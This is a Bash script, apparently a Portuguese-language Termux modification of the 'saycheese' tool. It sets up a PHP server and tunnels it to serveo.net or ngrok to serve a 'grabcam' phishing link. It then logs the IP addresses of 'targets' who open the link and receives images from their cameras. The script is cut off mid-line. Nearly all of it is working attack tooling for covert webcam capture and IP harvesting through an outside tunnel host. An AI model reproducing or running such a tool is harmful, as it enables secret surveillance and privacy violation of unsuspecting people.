#!/bin/bash
# Coded by: github.com/thelinuxchoice/saycheese
# Este script foi modificado por Noob Hackers
# Agradecimentos especiais ao linuxchoice
# Se você usar qualquer parte deste código, dê-me os créditos. Leia a Licença!

clear
termux-setup-storage
pkg install php -y
pkg install wget -y
clear

trap 'printf "\n"; stop' 2

banner() {
    echo '
 __
/__/\___
/__/[]\/__/|o-_
| _ _ || -_
| ((_)) || -_
|__________|/
 ___ ____ __ ____ ___ __ _ _
/ __)( _ _/ _\ ( _ \ / __)/ _\ ( \/ )
( (_ \ ) // __ \ ) _ (( (__ / __ \ / \/ \
\___/(__\)_/\_/(____/ \___)\_/\_/\_)(_& v1.1' | lolcat

    echo " "
    printf " \e[1;77m v1.0 codificado por github.com/thelinuxchoice/saycheese\e[0m \n"
    printf " \e[1;77m v1.1 Este script renascido por { Noob Hackers }\e[0m \n"
    printf "\n"

    echo "      N073:> POR FAVOR, LIGUE SEU HOTSPOT"
    echo "                   OU VOCÊ NÃO RECEBERÁ O LINK....!"
}

stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)

    if [[ $checkngrok == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi

    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi

    exit 1
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "Preciso de php, mas não está instalado. Instale-o. Abortando."; exit 1; }
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Aguardando alvos, \e[0m\e[1;77mPressione Ctrl + C para sair...\e[0m\n"

    while [ true ]; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m\e[1;92m+\e[0m\e[1;92m] Alvo abriu o link!\n"
            catch_ip
            rm -rf ip.txt
        fi

        sleep 0.5

        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;92m[\e[0m\e[1;92m+\e[0m\e[1;92m] Arquivo da câmera recebido!\e[0m\n"
            rm -rf Log.log
        fi

        sleep 0.5
    done
}

server() {
    command -v ssh > /dev/null 2>&1 || { echo >&2 "Preciso de ssh, mas não está instalado. Instale-o. Abortando."; exit 1; }
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Iniciando Serveo...\e[0m\n"

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi

    if [[ $subdomain_resp == true ]]; then
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
        sleep 8
    else
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
        sleep 8
    fi

    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Iniciando servidor php... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Link direto:\e[0m\e[1;77m %s\n' $send_link
}

payload_ngrok() {
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
    sed 's+forwarding
